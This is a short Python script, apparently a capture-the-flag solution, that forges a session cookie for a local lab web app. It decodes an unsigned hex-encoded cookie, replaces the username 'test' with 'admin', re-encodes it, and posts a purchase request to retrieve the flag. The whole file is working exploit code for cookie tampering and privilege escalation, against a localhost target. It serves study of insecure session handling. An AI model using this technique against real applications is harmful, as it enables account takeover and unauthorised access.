import requests
from base64 import b16decode, b16encode

url = 'http://localhost:5001/buy'

# Get an example session by creating a user and looking at the cookie
# Notice there are a lot of printable hex characters here...
session = '7B2275736572223A2274657374222C202276616C6964223A317D'
session = b16decode(session)
# Notice there is no signature and the username is visible...
print "Original session token data: %s" % session
# From the comments in the HTML, recognize there is an admin account
# visiable at /directory with a million credits:
session = session.replace('test','admin')
print "New session token data: %s" % session
# Become the admin...
session = b16encode(session)
headers = {'Cookie': 'session=%s;' % session,
           'Content-Type': 'application/json'}
# Get the flag...
result = requests.post(url, data='{"item":"flag"}',
                            headers=headers).text
print(result)
